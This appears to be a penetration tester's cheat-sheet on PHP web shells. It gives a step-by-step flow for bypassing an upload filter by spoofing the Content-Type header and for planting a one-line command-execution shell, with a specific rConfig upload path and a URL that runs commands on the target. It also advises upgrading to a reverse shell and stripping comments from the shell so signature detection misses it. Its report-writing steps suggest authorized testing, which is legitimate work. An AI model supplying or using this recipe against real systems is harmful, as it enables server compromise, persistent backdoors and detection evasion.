# PHP Web Shells

Practical flow: find PHP app → identify upload function → bypass file type restriction → navigate to shell.

File type bypass via Burp — intercept the upload POST, change `Content-Type: application/x-php` to `Content-Type: image/gif`, forward:

```
Content-Type: image/gif
```

Shell lands at whatever path the app stores uploads — check the response or app behavior to find it. For rConfig: `/images/vendor/<SHELL>.php`

Minimal PHP web shell if you need a one-liner instead of a full framework shell:

```php
<?php system($_GET['cmd']); ?>
```

Execute via URL:

```
http://<TARGET>/images/vendor/<SHELL>.php?cmd=id
```

---

### Post-Upload Checklist

Upgrade to reverse shell immediately — don't work through the browser. Delete the web shell file after establishing the reverse shell. Document the filename, upload path, and hash in your notes for the report.

> [!warning] Web shells get auto-deleted on some apps after a set time. Non-interactive shells break command chaining (`&&`, pipes may not work). Establish a proper reverse shell before doing any real post-ex work.

> [!tip] Strip all comments from the PHP file before uploading — author credits and usage notes in web shells are commonly signatured. A clean `<?php system($_GET['cmd']); ?>` is less detectable than WhiteWinterWolf's full commented version.